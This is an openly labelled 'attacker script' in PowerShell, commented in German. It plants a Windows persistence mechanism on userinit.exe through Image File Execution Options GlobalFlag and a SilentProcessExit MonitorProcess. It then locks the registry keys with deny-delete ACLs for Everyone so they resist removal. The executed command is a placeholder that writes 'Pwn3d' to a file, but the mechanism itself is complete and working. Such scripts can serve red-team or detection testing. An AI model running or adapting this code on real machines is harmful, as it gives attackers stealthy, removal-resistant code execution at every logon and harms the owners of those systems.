#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Attacker-Script: Setzt IFEO GlobalFlag und SilentProcessExit MonitorProcess
    für userinit.exe. Schützt die Einträge via Registry-ACL gegen Entfernung.
#>

$targetProcess = "userinit.exe"

$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProcess"
$spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProcess"
$ifeoParentPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

function Set-RegistryDenyDelete {
    param ([string]$RegistryPath)

    Write-Host "[*] Verarbeite: $RegistryPath"

    # Prüfen ob der Schlüssel existiert
    $testPath = $RegistryPath
    if (-not (Test-Path $testPath)) {
        Write-Warning "    Schlüssel existiert nicht, überspringe: $testPath"
        return
    }

    # HKLM:\ für OpenSubKey entfernen
    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""

    try {
        # Schlüssel mit ChangePermissions-Recht öffnen
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $cleanPath,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )

        if ($null -eq $key) {
            Write-Warning "    Konnte Schlüssel nicht öffnen (keine Rechte?): $RegistryPath"
            return
        }

        $acl = $key.GetAccessControl()

        # Deny Delete für Everyone setzen
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
            "Everyone",
            [System.Security.AccessControl.RegistryRights]::Delete,
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny
        )

        $acl.AddAccessRule($rule)
        $key.SetAccessControl($acl)
        $key.Close()

        Write-Host "    [+] Deny Delete gesetzt." -ForegroundColor Green

    } catch {
        Write-Error "    Fehler bei $RegistryPath`: $_"
    }
}


function Set-RegistryDenyDeleteSubkeys {
    param ([string]$RegistryPath)

    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $cleanPath,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )

        if ($null -eq $key) {
            Write-Warning "    Konnte Parent nicht öffnen: $RegistryPath"
            return
        }

        $acl = $key.GetAccessControl()
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
            "Everyone",
            [System.Security.AccessControl.RegistryRights]::DeleteSubdirectories,
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny
        )
        $acl.AddAccessRule($rule)
        $key.SetAccessControl($acl)
        $key.Close()

        Write-Host "    [+] Deny DeleteSubdirectories auf Parent gesetzt." -ForegroundColor Green
    } catch {
        Write-Error "    Fehler bei $RegistryPath`: $_"
    }
}


try {
    # IFEO-Schluessel erstellen
    New-Item -Path $ifeoPath -Force

    # GlobalFlag setzen (0x200 = 512 als Dezimal)
    New-ItemProperty -Path $ifeoPath `
        -Name "GlobalFlag" `
        -Value 512 `
        -PropertyType DWORD `
        -Force

    # SilentProcessExit-Schluessel erstellen
    New-Item -Path $spePath -Force

    # MonitorProcess setzen
    New-ItemProperty -Path $spePath `
        -Name "MonitorProcess" `
        -Value "C:\Windows\System32\cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt" `
        -PropertyType String `
        -Force

    # ReportingMode setzen - notwendig, um den MonitorProzess zu starten
    New-ItemProperty -Path $spePath `
        -Name "ReportingMode" `
        -Value 1 `
        -PropertyType DWORD `
        -Force


    # ACL auf beide Registry-Schluessel setzen
    Set-RegistryDenyDelete $ifeoPath
    Set-RegistryDenyDelete $spePath
    Set-RegistryDenyDeleteSubkeys $ifeoParentPath

} catch {
    Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
}